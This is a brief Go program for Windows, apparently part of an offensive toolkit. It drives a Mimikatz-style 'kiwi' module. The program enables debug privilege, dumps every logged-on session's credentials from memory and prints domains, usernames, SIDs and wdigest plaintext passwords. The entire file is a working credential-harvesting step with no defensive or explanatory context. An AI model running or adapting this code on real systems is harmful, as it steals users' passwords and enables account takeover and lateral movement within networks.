// +build windows

package main

import (
	"fmt"

	"project/internal/logger"
	"project/internal/module/windows/kiwi"
	"project/internal/system"
)

func main() {
	kiwiMod, err := kiwi.NewKiwi(logger.Common)
	system.CheckError(err)

	err = kiwiMod.EnableDebugPrivilege()
	system.CheckError(err)

	creds, err := kiwiMod.GetAllCredential()
	system.CheckError(err)

	for _, cred := range creds {
		session := cred.Session
		fmt.Println("Domain:      ", session.Domain)
		fmt.Println("Username:    ", session.Username)
		fmt.Println("Logon server:", session.LogonServer)
		fmt.Println("SID:         ", session.SID)
		fmt.Println("  wdigest:")
		if cred.Wdigest != nil {
			wdigest := cred.Wdigest
			fmt.Println("    *Domain:  ", wdigest.Domain)
			fmt.Println("    *Username:", wdigest.Username)
			fmt.Println("    *Password:", wdigest.Password)
		}
		fmt.Println()
	}
}
